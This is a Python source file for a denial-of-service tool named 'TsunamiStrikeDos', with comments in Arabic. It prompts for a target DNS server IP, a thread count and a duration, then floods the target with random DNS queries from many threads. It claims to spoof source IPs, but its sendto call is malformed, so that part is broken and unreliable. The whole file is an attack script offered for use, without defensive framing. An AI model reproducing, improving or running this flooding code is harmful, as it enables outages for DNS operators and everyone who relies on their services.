import socket
import random
import threading
from colorama import Fore as F
from concurrent.futures import ThreadPoolExecutor
import time

print(f'''
{F.GREEN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                {F.CYAN} TsunamiStrikeDos {F.GREEN}V 3.1 {F.RESET}
''')

# دالة لتوليد اسم نطاق مزيف عشوائي
def generate_random_domain():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15))) + ".com"

# دالة لتوليد IP وهمي (إن كنت ترغب في التزوير)
def generate_fake_ip():
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))  # تجنب IP broadcast

# هجوم DNS
def dns_flood(target_ip, target_port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # استخدام UDP لأن DNS يعتمد عليه
    fake_ip = generate_fake_ip()  # IP مزيف
    try:
        while True:
            domain = generate_random_domain()
            query_type = random.choice([b"\x00\x01", b"\x00\x1c", b"\x00\x0f"])  # A, AAAA, MX
            request = (
                b"\xAA\xAA"  # ID
                b"\x01\x00"  # Flags
                b"\x00\x01"  # Number of questions
                b"\x00\x00"  # Number of answers
                b"\x00\x00"  # Number of authority records
                b"\x00\x00"  # Number of additional records
            )
            for part in domain.split("."):
                request += bytes([len(part)]) + part.encode("utf-8")
            request += b"\x00" + query_type + b"\x00\x01"  # Query class: IN

            # استخدام IP المزيف في الهجوم
            sock.sendto(request, (target_ip, target_port), 0, (fake_ip, 0))
            print(f"{F.CYAN}Request Sent!{F.RESET} | Fake IP: {F.YELLOW}{fake_ip}{F.RESET} | Domain: {F.GREEN}{domain}{F.RESET}", flush=True)
    except Exception as e:
        print(f"{F.RED}Error: {e}{F.RESET}", flush=True)

# تشغيل الهجوم عبر عدة threads باستخدام ThreadPoolExecutor
def start_dns_flooding(target_ip, thread_count, duration):
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        end_time = time.time() + duration
        while time.time() < end_time:
            for _ in range(thread_count):
                executor.submit(dns_flood, target_ip)

if __name__ == "__main__":
    target_ip = input(f"{F.CYAN}[?]{F.RESET} Target IP DNS: {F.GREEN}")
    num_threads = int(input(f"{F.CYAN}[?]{F.RESET} Threads: {F.GREEN}"))
    attack_duration = int(input(f"{F.CYAN}[?]{F.RESET} Duration (seconds): {F.GREEN}"))
    
    start_dns_flooding(target_ip, num_threads, attack_duration)
    print(f"{F.CYAN}Attack Finished!{F.RESET}", flush=True)